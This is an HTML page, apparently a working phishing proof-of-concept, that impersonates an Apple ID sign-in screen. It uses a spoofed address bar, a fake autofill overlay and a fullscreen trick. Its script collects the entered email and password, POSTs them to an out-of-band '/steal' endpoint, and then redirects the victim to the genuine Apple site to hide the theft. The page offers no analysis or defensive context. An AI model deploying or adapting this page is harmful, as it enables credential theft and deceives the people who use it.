<!DOCTYPE html>
<html>
<head>
  <title>üîê Sign in to Your Apple ID</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f2f2f7;
      color: #000;
      height: 100%;
      overflow: hidden;
    }

    .navbar {
      height: 44px;
      background-color: #f9f9f9;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 15px;
      font-weight: 500;
      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      z-index: 9999;
      position: fixed;
      width: 100%;
      top: 0;
    }

    .container {
      padding: 80px 24px;
      max-width: 380px;
      margin: auto;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 14px;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 17px;
    }

    .autofill-overlay {
      position: absolute;
      top: 144px;
      left: 24px;
      width: calc(100% - 48px);
      height: 46px;
      background: #fff;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 12px;
      font-size: 16px;
      color: #222;
      box-shadow: 0 2px 5px rgba(0,0,0,0.08);
      z-index: 999;
      cursor: pointer;
    }

    .fullscreen-btn {
      margin-top: 20px;
      padding: 12px;
      background: #007aff;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="navbar">üîí https://appleid.apple.com</div>

<div class="container">
  <h2>Apple ID Required</h2>

  <input type="email" id="email" placeholder="Email or Apple ID" autocomplete="on" autofocus>
  <div class="autofill-overlay" onclick="stepIntoFullscreen()">user@icloud.com</div>

  <input type="password" id="pass" placeholder="Password" autocomplete="on">

  <button class="fullscreen-btn" onclick="stepIntoFullscreen()">Continue</button>
</div>

<script>
function stepIntoFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen) el.requestFullscreen();
  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

  // Chained with overlay click ‚Üí now start idle timing
  window.requestIdleCallback(() => {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if (email.length > 3 && pass.length > 3) {
      exfiltrate(email, pass);
    }
  }, { timeout: 1000 }); // <= short delay but stealth
}

function exfiltrate(email, pass) {
  fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
    method: "POST",
    body: JSON.stringify({ email, pass }),
    headers: { "Content-Type": "application/json" }
  });

  setTimeout(() => {
    location.href = "https://appleid.apple.com"; // misattribution
  }, 700);
}
</script>

</body>
</html>
